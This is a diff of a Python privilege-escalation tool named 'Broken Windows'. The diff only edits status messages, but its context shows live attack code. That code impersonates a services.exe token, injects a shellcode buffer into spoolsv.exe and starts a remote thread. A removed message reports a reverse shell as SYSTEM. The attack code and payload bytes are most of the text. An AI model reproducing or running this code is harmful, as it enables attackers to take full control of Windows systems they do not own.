@@ -54,6 +54,8 @@ def impersonate(services_pid):
     ctypes.windll.kernel32.CloseHandle(services_token_handle)
     ctypes.windll.kernel32.CloseHandle(impersonation_token_handle)
 
+    print("Obtained impersonation token from services.exe.")
+
 
 def debug(spoolsv_pid, buf):
 
@@ -80,7 +82,7 @@ def debug(spoolsv_pid, buf):
     ctypes.windll.kernel32.CloseHandle(spoolsv_process_handle)
     ctypes.windll.kernel32.CloseHandle(payload_thread_handle)
 
-    print("Successfully popped reverse shell as SYSTEM.")
+    print("Successfully injected into spoolsv.exe and created thread.")
 
 
 if __name__ == "__main__":
@@ -128,7 +130,7 @@ if __name__ == "__main__":
     buf += b"\xbd\xfd\x65\xc7\xc7\x81\x7f\xb7\x33\x99\xf5\xb2\x78"
     buf += b"\x1e\xe5\xce\x11\xca\x09\x76\xaf\x83\xd0\x77\xfa"
 
-    print("Starting Broken Windows...\n")
+    print("\nStarting Broken Windows...\n")
 
     services_pid, spoolsv_pid = get_pids()
     impersonate(services_pid)
